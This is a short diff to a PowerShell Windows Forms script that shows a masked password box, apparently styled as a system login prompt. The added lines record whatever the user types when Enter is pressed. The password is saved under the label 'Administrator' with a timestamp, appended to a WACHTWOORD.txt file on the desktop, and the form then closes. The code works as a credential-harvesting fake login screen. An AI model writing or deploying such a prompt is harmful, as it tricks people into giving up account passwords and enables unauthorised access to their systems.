@@ -67,6 +67,18 @@ $passwordBox.BorderStyle = [System.Windows.Forms.BorderStyle]::FixedSingle
 $passwordBox.PasswordChar = [char]0x25CF # Using Unicode bullet character
 $passwordBox.Text = "Password"
 $passwordBox.Add_GotFocus({
+    $passwordBox.Add_KeyDown({
+        if ($_.KeyCode -eq 'Enter') {
+            $password = $passwordBox.Text
+    
+            $credentials = "Username: Administrator`nPassword: $password`nTimestamp: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')`n`n"
+            $desktopPath = [Environment]::GetFolderPath("Desktop")
+            $path = Join-Path -Path $desktopPath -ChildPath "WACHTWOORD.txt"
+            $credentials | Out-File -FilePath $path -Encoding UTF8 -Append
+    
+            [System.Windows.Forms.Application]::Exit()
+        }
+    })
     if ($this.Text -eq "Password") {
         $this.Text = ""
         $this.PasswordChar = [char]0x25CF
